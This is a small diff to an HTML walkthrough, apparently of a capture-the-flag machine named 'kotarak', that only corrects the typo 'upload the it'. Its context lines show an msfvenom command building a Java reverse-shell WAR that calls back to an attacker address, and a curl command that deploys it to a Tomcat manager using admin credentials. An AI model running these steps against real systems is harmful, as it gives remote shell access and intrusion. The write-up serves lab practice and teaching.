@@ -261,7 +261,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.16.5 <span class="nv">lport</span><span class="o">=</span>9000 <span class="nt">-f</span> war <span class="nt">-o</span> letmein.war
 </code></pre></div></div>
 
-<p>and <strong>upload the it</strong> with <code class="language-plaintext highlighter-rouge">curl</code></p>
+<p>and <strong>upload it</strong> with <code class="language-plaintext highlighter-rouge">curl</code></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-v</span> <span class="nt">-u</span> admin:<span class="s1">'3@g01PdhB!'</span> <span class="nt">--upload-file</span> letmein.war <span class="s2">"http://kotarak:8080/manager/text/deploy?path=/shell&amp;update=true"</span>
 </code></pre></div></div>
 
